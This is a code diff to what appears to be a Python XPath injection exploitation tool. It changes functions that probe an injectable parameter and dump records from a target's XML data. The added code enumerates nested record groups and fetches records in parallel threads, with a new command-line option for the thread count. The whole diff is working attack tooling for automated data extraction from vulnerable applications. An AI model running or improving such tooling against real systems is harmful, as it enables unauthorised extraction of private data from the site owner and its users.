@@ -18,7 +18,9 @@ import sys
 import time
 import xml.dom.minidom
 import xml.etree.ElementTree as ET
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field as dc_field
+from threading import Lock
 from typing import Optional
 from urllib.parse import urlparse, parse_qs
 
@@ -520,23 +522,115 @@ def exfiltrate_record(
     engine: Engine,
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
-    base_indices: list[int],
+    record_path: list[int],       # path to the record node (without field index)
     extractor: ResponseExtractor,
     max_fields: int = 20,
 ) -> list[str]:
-    """
-    Extract all fields of one record.
-    base_indices points to the record node (last index will be incremented for each field).
-    """
+    """Extract all fields of one record by appending field index 1..N."""
     values: list[str] = []
     for field_idx in range(1, max_fields + 1):
         raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
-                        base_indices + [field_idx])
+                        record_path + [field_idx])
         val = extractor.extract(raw)
         if val is None:
             break
         values.append(val)
     return values
+
+
+def collect_all_record_paths(
+    engine: Engine,
+    inj_param: str, null_pay: str,
+    node_param: str, field_name: str,
+    first_data_path: list[int],
+    extractor: ResponseExtractor,
+    max_siblings: int,
+    max_records: int,
+) -> list[list[int]]:
+    """
+    Given the path to the FIRST data leaf, reconstruct all record-level paths.
+
+    The structure is:
+      first_data_path = [root, dataset, *groups, record_idx, field_idx]
+      first_data_path[-1] = first field index (usually 1)
+      first_data_path[-2] = first record index within its group
+      first_data_path[2:-2] = intermediate group indices (may be any values)
+
+    We need to:
+      1. Iterate record_idx within each group (first_data_path[2:-1])
+      2. Iterate ALL group combinations (each intermediate level 2..-2)
+
+    Strategy: treat every level between [dataset_idx] and [record_idx] as a
+    potential "group level". We enumerate all combinations of group indices
+    and within each combination enumerate record indices.
+    """
+    # Decompose the path
+    # path = [1, ds, g1, g2, ..., gN, rec, field]
+    # prefix_fixed = [1, ds]   (never changes)
+    # group_levels = [g1, g2, ..., gN]  (0 or more intermediate group indices)
+    # rec = first_data_path[-2]
+
+    prefix_fixed  = first_data_path[:2]            # [1, dataset_idx]
+    group_indices = list(first_data_path[2:-2])    # intermediate group path
+    n_group_levels = len(group_indices)
+
+    all_record_paths: list[list[int]] = []
+
+    if n_group_levels == 0:
+        # No intermediates: path is [root, ds, rec, field]
+        # Just iterate rec_idx
+        for rec_idx in range(1, max_records + 1):
+            all_record_paths.append(prefix_fixed + [rec_idx])
+        return all_record_paths
+
+    # We have group levels. Enumerate all combinations by probing each level.
+    # For each group level L, find valid indices by probing with a fixed suffix.
+    # We do this recursively / iteratively: build the group prefix level by level.
+
+    def enumerate_group_combos(
+        fixed_prefix: list[int],
+        remaining_levels: int,
+    ) -> list[list[int]]:
+        """Return all valid group-prefix paths of `remaining_levels` more levels."""
+        if remaining_levels == 0:
+            return [fixed_prefix]
+
+        result = []
+        for idx in range(1, max_siblings + 1):
+            candidate = fixed_prefix + [idx]
+            # Quick probe: append [1] for remaining levels + [1] field to check if alive
+            probe_path = candidate + [1] * (remaining_levels - 1) + [1, 1]
+            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name, probe_path)
+            val = extractor.extract(raw)
+            if val is not None:
+                # This group index has data — explore further
+                sub = enumerate_group_combos(candidate, remaining_levels - 1)
+                result.extend(sub)
+            elif raw and len(raw) > 100:
+                # Group exists but need to go deeper
+                sub = enumerate_group_combos(candidate, remaining_levels - 1)
+                result.extend(sub)
+            else:
+                # Group index doesn't exist — stop scanning siblings for this level
+                # (XPath indices are contiguous from 1)
+                break
+        return result
+
+    group_combos = enumerate_group_combos(prefix_fixed, n_group_levels)
+    info(f"    Found {len(group_combos)} group prefix(es) to iterate")
+
+    for group_prefix in group_combos:
+        for rec_idx in range(1, max_records + 1):
+            record_path = group_prefix + [rec_idx]
+            # Quick probe field 1 to see if record exists
+            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
+                            record_path + [1])
+            val = extractor.extract(raw)
+            if val is None:
+                break  # No more records in this group
+            all_record_paths.append(record_path)
+
+    return all_record_paths
 
 
 def exfiltrate_dataset(
@@ -547,11 +641,12 @@ def exfiltrate_dataset(
     extractor: ResponseExtractor,
     max_depth: int, max_records: int, max_fields: int,
     max_siblings: int = 20,
+    threads: int = 5,
 ) -> list[list[str]]:
     print()
     info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")
 
-    # Step 1: find the path to the first actual data value
+    # Step 1: find path to first data value via BFS
     first_path = detect_first_data_path(
         engine, inj_param, null_pay, node_param, field_name,
         dataset_idx, extractor, max_depth, max_siblings,
@@ -562,61 +657,50 @@ def exfiltrate_dataset(
 
     info(f"    First data path: {build_path(first_path)}")
 
-    # Step 2: decompose the path
-    # Structure: [root=1, dataset_idx, *intermediate, record_idx, field_idx]
-    # first_path[-1] is field_idx (=1, the first field)
-    # first_path[-2] is record_idx (=1, the first record)
-    # first_path[2:-2] are intermediate group nodes (any indices)
     if len(first_path) < 4:
         warn("    Path too short to decompose into record/field structure.")
         return []
 
-    # The "record prefix" = everything up to but not including the record index
-    # i.e. [root, dataset, *groups]  — we'll append [rec_idx] to this
-    record_prefix = first_path[:-2]   # [1, dataset_idx, *intermediates]
-    # first record index found
-    first_rec_idx = first_path[-2]
+    # Step 2: collect ALL record-level paths (handles groups at any index)
+    info("    Enumerating all record paths (iterating groups)...")
+    record_paths = collect_all_record_paths(
+        engine, inj_param, null_pay, node_param, field_name,
+        first_path, extractor, max_siblings, max_records,
+    )
+    info(f"    Total records to fetch: {len(record_paths)}")
 
-    info(f"    Record prefix: {build_path(record_prefix)}")
-    info(f"    First record index: {first_rec_idx}")
+    if not record_paths:
+        warn("    No record paths found.")
+        return []
 
-    records: list[list[str]] = []
-    global_rec_num = 0
+    # Step 3: fetch all records in parallel
+    records_map: dict[int, list[str]] = {}
+    lock = Lock()
+    counter = [0]
 
-    # Step 3: iterate records starting from the first discovered record index
-    for rec_idx in range(first_rec_idx, first_rec_idx + max_records):
-        base   = record_prefix + [rec_idx]
-        record = exfiltrate_record(
+    def fetch_record(idx_path: tuple[int, list[int]]) -> tuple[int, list[str]]:
+        order, rpath = idx_path
+        rec = exfiltrate_record(
             engine, inj_param, null_pay, node_param, field_name,
-            base, extractor, max_fields,
+            rpath, extractor, max_fields,
         )
-        if not record:
-            # Some datasets have non-contiguous record indices (groups/subgroups).
-            # Try a few more before giving up.
-            debug(f"    No record at index {rec_idx}, trying next...")
-            # Allow up to 3 consecutive misses before stopping
-            misses = 0
-            for skip in range(rec_idx + 1, rec_idx + 4):
-                base2 = record_prefix + [skip]
-                r2    = exfiltrate_record(
-                    engine, inj_param, null_pay, node_param, field_name,
-                    base2, extractor, max_fields,
-                )
-                if r2:
-                    records.append(r2)
-                    global_rec_num += 1
-                    found(f"Record {global_rec_num:>3} [idx={skip}]: {' | '.join(r2)}")
-                    break
-                misses += 1
-            else:
-                info(f"    End of records at index {rec_idx}.")
-                break
-            continue
+        return order, rec
 
-        global_rec_num += 1
-        found(f"Record {global_rec_num:>3} [idx={rec_idx}]: {' | '.join(record)}")
-        records.append(record)
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {
+            executor.submit(fetch_record, (i, p)): i
+            for i, p in enumerate(record_paths)
+        }
+        for future in as_completed(futures):
+            order, rec = future.result()
+            if rec:
+                with lock:
+                    records_map[order] = rec
+                    counter[0] += 1
+                    found(f"Record {counter[0]:>4} {build_path(record_paths[order])}: {' | '.join(rec)}")
 
+    # Return records in original order
+    records = [records_map[i] for i in sorted(records_map)]
     return records
 
 
@@ -628,6 +712,7 @@ def run_node_selection(
     max_datasets: int, max_depth: int,
     max_records: int, max_fields: int,
     max_siblings: int = 20,
+    threads: int = 5,
 ) -> dict[int, list[list[str]]]:
     info(f"Node-selection | inj='{inj_param}' node='{node_param}' field='{field_name}'")
 
@@ -667,7 +752,7 @@ def run_node_selection(
         records = exfiltrate_dataset(
             engine, inj_param, null_pay, node_param, field_name,
             ds_idx, extractor, max_depth, max_records, max_fields,
-            max_siblings=max_siblings,
+            max_siblings=max_siblings, threads=threads,
         )
         if records:
             all_data[ds_idx] = records
@@ -856,6 +941,8 @@ def parse_args():
     p.add_argument("--predicate-step", type=int,   default=5)
     p.add_argument("--max-siblings",   type=int,   default=20,
                    help="Max sibling indices to probe per BFS level (default: 20)")
+    p.add_argument("--threads",        type=int,   default=5,
+                   help="Number of threads for parallel record fetching (default: 5)")
     p.add_argument("--result-start",   default=None,
                    help="Regex pattern marking start of result value (e.g. 'Results:.*?<br><br>')")
     p.add_argument("--result-end",     default=None,
@@ -956,7 +1043,7 @@ def main():
         data = run_node_selection(
             engine, inj_param, null_pay, node_param, field_name, extractor,
             args.max_datasets, args.max_depth, args.max_records, args.max_fields,
-            max_siblings=args.max_siblings,
+            max_siblings=args.max_siblings, threads=args.threads,
         )
         xml_str = build_xml(data, field_name) if data else None
     else:
